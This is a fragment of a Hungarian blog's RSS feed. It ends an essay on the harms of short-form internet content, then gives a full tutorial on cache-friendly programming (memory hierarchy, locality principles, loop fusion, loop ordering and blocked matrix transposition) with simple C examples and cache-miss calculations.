<p>Csak hogy konkrétumokat is említsek, a koncetrálóképesség drasztikusan csökken short content huzamos fogyasztása után. Az agyunk mindig alkalmazkodik a körülményekhez, és ha mi mindig maximum 1 perces tartalmakat fogyasztunk, akkor egyszerűen átprogramozza magát az agy és egy könyv elolvasása már nem fogja tudni lekötni a figyelmünket. Nem csak a könyvektől esünk el így, de minden mástól is ami egy kicsit is hosszabb gondolatmenetet igényel. Ha már könyveket megemlítettem, érdemes azt is leszögezni, hogy az interneten fogyasztott tartalom egyre nagyobb része vizuális. Ez talán azért hátrányos, mert így a kreativitásunkat soha nem kell megmozgatni, hogy elképzeljünk valamit, hiszen már ott van készen előttünk.</p>
<h2 id="és-a-csúf">És a Csúf</h2>
<p>Az internet bármennyire is egy csodálatos és utópisztikus elképzelés volt, jelen pillanatban a tömegek kihasználásáról, szárazra fejéséről szól, ahol az emberek már nem gyártanak semmi valódi értéket, csupán fogyasztók. Minden azzal keződik, hogy reggel felkelsz az álmodból. Itt az ideje felkelni, felkelni az álómból, a kényelemből és szembenézni a valósággal, ami lehet csúf vagy reménytelen, sárga és keserű, de legalább a miénk. Használd az internetet, de ne az internet használjon téged.</p>
<p>Remélem sikerült jól összefoglalnom ezt a pár gondolatomat a témában, ha van bármi hozzászólásod ne tartsd magadban! Legyen szép napod!</p>
]]></content>
        </item>
        
        <item>
            <title>Lokalitástudatos programozás</title>
            <link>http://localhost:1313/hu/posts/2024/06/lokalit%C3%A1studatos-programoz%C3%A1s/</link>
            <pubDate>Fri, 28 Jun 2024 13:20:06 +0200</pubDate>
            
            <guid>http://localhost:1313/hu/posts/2024/06/lokalit%C3%A1studatos-programoz%C3%A1s/</guid>
            <description>Egyáltalán nem mindegy, hogy egy mátrixot, oszloponként, vagy soronkét, nehogy Isten véletlenszerűen járjuk be. Ebben a cikkben körüljárjuk, hogy hogyan lehet számítógépes ismereteinket igába hajtani, a programunk előnyére.</description>
            <content type="html"><![CDATA[<p>Neumann architektúrája óta, egy számítógép müködése során, a futtatandó utasításokat, és ezen utasítások által hivatkozott címek tartalmát is egy memóriában tárolja. A programban használt adatok, úgynevezett adatmemóriból érhetőek el, ez pedig tárhierarchiába rendeződik.</p>
<h2 id="tárhierarchia">Tárhierarchia</h2>
<p>A számítógépünk teljesítménye lényegében a processzor és a memória órajeléből tevődik össze, és eme két egység közül, a memória az ami a processzor mögött kullog. Ez azt jelenti, hogy hiába a magas CPU órajel, ha a memória szűk keresztmetszetként viselkedik mellette, mivel ha az éppen végrehajtandó utasításnál, nincsen kéznél a használandó adat, akkor a processzor várakozásra kényszerűl, ezáltal nem használja ki teljes potenciálját, így suboptimális lesz a kihasználtsága.</p>
<h3 id="lokalitási-elvek">Lokalitási elvek</h3>
<p>Nagy <em>szerencse</em> hogy a számítógépes programok többsége valamilyen mintát követnek, mikor a memóriába nyúlnak, úgynevezett <strong>lokalitási elveket</strong>, és ezeket kihasználva tudunk a teljesítményen javítani. Többféle lokalitási elvet is ismerünk:</p>
<p>Ha egy memóriában tárolt adaton műveletet végeztünk&hellip;</p>
<ul>
<li><em><strong>Időbeli lokalitás:</strong></em> &hellip;akkor valószínüleg a közel jövőben is használni fogjuk. Példa: egy ciklus számlálóját minden ciklusban növelem.</li>
<li><em><strong>Térbeli lokalitás:</strong></em> &hellip;akkor valószínüleg a közelben lévő adatokat is használni fogjuk. Példa: egy tömböt bejárok.</li>
<li><em><strong>Algoritmikus lokalitás:</strong></em> Sok program dinamikus adatstruktúrákkal dolgozik (pl. bináris fák, láncolt listák), ezek viszont nem felelnek meg se nem a térbeli se nem az időbeli lokalitásnak (mivel a memóriában nem folytonosan helyezkednek el), ámde mégis szabályos viselkedést eredményeznek, melyet ki lehet használni.</li>
</ul>
<p>Tehát ha lokalitási elvek szerint, a processzor közelébe helyezzük a gyakran használt adatokat és környezetüket, akkor csökkenthetjük a lassú és költséges memória műveletek számát. Ekkor is memóriában helyezzük el az adatainkat, csak egy sokkal gyorsabb de kisebb és magasabb fogyasztásúban. Ezt a memóriát cache memóriának nevezzük. De milyen technológiát használnak cachenél?</p>
<p>Több memória technológiát is ismerünk, mint például a magas adatsűrűségű és olcsóbb, de lasúbb DRAM, vagy az alacsony adatsűrűségű és drága, de gyors SRAM. Egy bit tárolásához, A DRAM 1 tranzisztort, az SRAM pedig 6-ot használ, innen ered a fogyasztás, adatsűrűség és az ár különbség. Egyiknél sem teljesülhet viszont egyszerre az, hogy olcsó, gyors és nagy, így mindig az igényekhez igazítva, a kompromisszum kötés elkerülhetetlen. Itt jön be a tárhierarchia miszerint több szintből építjük fel a memóriát úgy, hogy az adott szintet minél többször használja a processzor, annál gyorsabb és ezáltal kisebb legyen.</p>
<p><img alt="tárhierarchia" src="/tarhierarchia.png"></p>
<p>A leglassabb tárolón, a háttértáron tartjuk a legkevésbé használt, de nagy mennyiségű adatokat, általában HDD-n vagy SSD-n. A gyakran használt adatokat az operatív memóriában tároljuk, általában DRAM-ot használva, és az éppen futó program vagy process által használt adatokat (pl. egy lokális  változót) pedig a cache-ben tartjuk, ami SRAM-ból épül fel.</p>
<blockquote>
<p>A cache további müködését itt nem részletezem, de ha érdekel akkor érdemes utánanézni, hogy mi alapján kerülnek be a cache-be az adatok, mert nyílván mikor a program hivatkozik a memóriára akkor már készen kell állnia a cache-ben, így valahogy meg kellene jósolni, hogy a jövőben használni fogjuk-e az adatot, ugyanakkor nem szemetelhetjük tele a cache-t mindennel mert kicsi :(, ezért jó tippnek kell lennie. Prefetch-nek nevezik ezt, és egyszerűbb mind aminek gondolnád.</p>
</blockquote>
<p>Mind ezek szerint elengedhetetlen, hogy a processzor kihasználás érdekében, a programozó segítse a tárhierarchia munkáját:</p>
<ul>
<li>A cache esetében, ha a programozó össze-vissza hivatkozik a memóriára, akkor sok lesz a cache hiba, és így kénytelen lesz a számítógép a lomha memóriához nyúlni.</li>
<li>A DRAM alapú rendszermemória esetében az azonos sorban lévő cellák elérése gyors, de ha itt is véletlenszerűen hivatkozunk a címekre, akkor az új sorok megnyitása költésges és lassú művelet lesz.</li>
</ul>
<p><strong>Tehát a programozó célja, hogy a memóriákat úgy címezze, hogy azok megfeleljenek a lokalitási elveknek. Hogyan?</strong></p>
<h2 id="lokalitásbarát-ciklusszervezés">Lokalitásbarát ciklusszervezés</h2>
<p>A gyakorlatban számtalan alkalommal van szükség egy-, vagy többdimenziós tömbök bejárása, ehhez pedig ciklus(ok) szükséges(ek). Példát mutatok azon ciklusszervezési technikákra, melyek hasznosítják az imént kifejtett tárhierarchiai ismereteinket, és ezzel javítják programunk futásidejét.</p>
<h3 id="ciklusegyesítés">Ciklusegyesítés</h3>
<p>Eredeti kód:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    b[i] <span style="color:#f92672">=</span> c <span style="color:#f92672">*</span> a[i] <span style="color:#f92672">-</span> x;
</span></span><span style="display:flex;"><span>sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">+=</span> b[i];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>( <span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    d[i] <span style="color:#f92672">=</span> a[i] <span style="color:#f92672">+</span> b[i];
</span></span></code></pre></div><p>Fenti kód egy C nyelvű mezei, iskolapélda kód. Most mindenki kapaszkodjon meg mert matekozni fogunk. Számoljuk ki a cache hiba-arányt azaz azt, hogy összes cache-hez intézett kérésünk közül mennyiszer kaptuk azt a választ, hogy sajnos a lassú memóriához kell nyúlnunk, merta cache-ben nincsen benne az, amit keresünk. Tegyük fel az alábbiakat az egyszerűség kedvéért:</p>
<ul>
<li>N legyen a tömb mérete tetszőlegesen nagy</li>
<li>a cache blokk mérete 64 bájt</li>
<li>a tömb elemei 8 bájtos double-ök</li>
<li>az i, c, x és sum elérése nem jár memória-hozzáféréssel.</li>
</ul>
<p>Az első for ciklus bejárja az a és b tömböt. Az i = 0 -nál cache hibát kaptunk a[0] és b[0] esetben is, mivel üres volt eddig még a cache-ünk. Ha cache hiba történik akkor viszont 8 tömb elem kerül be a cachebe, mivel a térbeli lokalitás szerint azt feltételezzük, hogy a soron következő elemeket is használni fogjuk, és több már nem is férne bele egy cache blokkba (64/8=8). Tehát 8 lépésenkét lesz cache hiba, és mivel 2N memóriahivatkozás van ezért itt 2N/8 cache hiba lesz.</p>
<p>A második for ciklusnál, ha N elég nagy volt akkor a b tömb eleje már nincs benne a cache-ben, mert a hátsó elemei már kiszórították onnan. Ezért itt, megint minden 8. hivatkozás cache hiba lesz, így N/8 hibát okozva.</p>
<p>Hasonlóan számolhatunk a harmadik ciklusban is, 3N hivatkozás függvényében 3N/8 cache hibát kapunk.</p>
<p>Szummázva a cache hibákat megkapjuk, hogy 6N memóriahivatkozásnál 1/8 lesz a cache-hiba arány, ami 12.5%.</p>
<p>Most pedig ciklusegyesítéssel a kód:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>N; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    b[i] <span style="color:#f92672">=</span> c <span style="color:#f92672">*</span> a[i] <span style="color:#f92672">+</span> x;
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">+=</span> b[i];
</span></span><span style="display:flex;"><span>    d[i] <span style="color:#f92672">=</span> a[i] <span style="color:#f92672">+</span> b[i];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Egyértelműen látszik, hogy ez az algoritmus ugyanazzal a funkcionalitással rendelkezik mind az eredeti, csak kicsit jobb. A ciklus hasában az első 2 memóriahivatkozás még mindig minden 8. lépésnél cache hibát okoz. A második sorban az a[i] és b[i] soha nem okozhat cache hibát, mivel már biztosan a cache-ben vannak az első sor révén. A harmadik sorban pedig az előző érvelés alapján csak a d[i] fog cache hibát dobni 8 lépésenként.</p>
<p>Tehát összesen 3N/8 (= 2N/8 + N/8) hibát kapunk így az arány 6N memóriahivatkozás mellett 1/16-od, ami 6.25%, azaz fele az előzőnek.</p>
<p>Itt látszik, hogy milyen kis energia befektetéssel, kétszer gyorsabb futásidőt kaptunk. Az első ökölszabály tehát, hogy amit lehet egyetlen ciklusban, azt egyetlen ciklusban érdemes megvalósítani.</p>
<h3 id="ciklusok-sorrendjének-optimalizálása">Ciklusok sorrendjének optimalizálása</h3>
<p>Az alábbi példában egy 2 dimenziós tömb, 2 különböző bejárásán mutatom meg, miért fontos a ciklusok sorrende.</p>
<p>Most először a jó példát mutatom</p>
<p>Bejárás sor-folytonosan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; j<span style="color:#f92672">&lt;</span>N; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">+=</span> a[i][j];
</span></span></code></pre></div><p>A cache hiba vizsgálása előtt tisztázni kell, hogy C nyelv a 2 dimenziós tömböket sor-folytonosan helyezi el a memóriában. Tehát ha van egy {{4, 2}, {0, 6}} 2 dimenziós tömb akkor az a memóriában</p>
<p>&hellip; 4 | 2 | 0 | 6 &hellip;.. módon kap helyet</p>
<p>Ekkor a bejárás soronként megy végig. Ez szerencsés hiszen a térbeli lokalitás miatt sorokat fog a számítógép is a cache-be rakni. Így a feljebb kikötött feltevések és 64 bájtos blokkméret, 8 bájtos elemméret mellett az algoritmus cache hiba-aránya 1/8-ad lesz, de prefetch algoritmussal még ezen is lehetne javítani.</p>
<p>Most nézzük meg, hogyan <strong>NE</strong> csináljuk</p>
<p>Bejárás oszlop-folytonosan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; j<span style="color:#f92672">&lt;</span>N; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">+=</span> a[i][j];
</span></span></code></pre></div><p>Itt felcseréltem a két ciklus sorrendjét. Ilyenkor hiába próbálja az egy sorban lévő elemeket (pl. a a[i][j+1], a[i][j+2], a[i][j+3] &hellip;) betölteni a számítógép, mert ha N &gt; 8, akkor a[i][j] után következő a[i+1][j] nem lesz benne a cache-ben biztosan. Ha N*8 nagyobb mint a cache méret akkor még ennél is rosszabb a helyzet, mivel mire a külső ciklus lép egyet j-ből j+1-be addigra a[i][j+1] már nem lesz benne a cache-ben, hiába olvastuk be a[i][j]-nél. Tehát minden memóriahivatkozás cache hibát dob, azaz 100% az arány.</p>
<h3 id="blokkos-ciklusszervezés">Blokkos ciklusszervezés</h3>
<p>Van még egy további technika, az úgynevezett blokkos ciklusszervezés, amikor is blokkonként járunk be egy mátrixot. Ez például akkor tud nagy segítséget nyújtani, amikor egy mátrixot kell transzponálni:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>N; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; j<span style="color:#f92672">&lt;</span>N; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>        b[j][i] <span style="color:#f92672">=</span> a[i][j];
</span></span></code></pre></div><p>Ekkor a-t sor-folytonosan b-t oszlop-folytonosan járjuk be, ezért a fenti példák alapján, elég nagy N esetén, b-nél 100% os lesz a cache hiba-arány. Ezen tudunk segíteni az alábbi módon:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (bi<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; bi<span style="color:#f92672">&lt;=</span>N<span style="color:#f92672">-</span>BLK; bi<span style="color:#f92672">+=</span>BLK)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (bj<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; bj<span style="color:#f92672">&lt;=</span>N<span style="color:#f92672">-</span>BLK; bj<span style="color:#f92672">+=</span>BLK)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span>bi; i<span style="color:#f92672">&lt;</span>bi<span style="color:#f92672">+</span>BLK; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (j<span style="color:#f92672">=</span>bj; j<span style="color:#f92672">&lt;</span>bj<span style="color:#f92672">+</span>BLK; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>                b[j][i] <span style="color:#f92672">=</span> a[i][j];
</span></span></code></pre></div><p>Kicsit obfuszkáltnak tűnhet, de talán az ábra segít</p>
<p><img alt="blokkos ciklus" src="/blokkosciklus.png"></p>
<p>Itt csak arra kell figyelni, hogy megfelelő BLK-t, azaz blokkméretet válasszunk, mivel az egésznek az a lényege, hogy akkora blokkot válasszunk, hogy minél kevesebbszer legyen cache hiba szummázva.</p>
<p>Kicsit edge-case-nek tűnhet ez az egész mátrix transzponálás, de a gyakorlatban rengeteg mátrix transzponálás és mátrix művelet történik, elég csak a grafikus kártyátokra nézni, ami pontosan erre van optimalizálva, a fenti technikáknál jóval bonyolúltabb módszerekkel is.</p>
<h2 id="összegzés">Összegzés</h2>
<p>Tehát megismerkedtünk a számítógépünk egy fontos elemével a tárhierarchiával, azon belül is szemügyre vettük jobban a cache-t, majd pedig ezt a tudást felhasználva gyakorlati problémákra tudtunk jobb teljesítményt eredményező megoldásokat találni. Kell ennél több? :D</p>
]]></content>
        </item>
        
    </channel>
</rss>
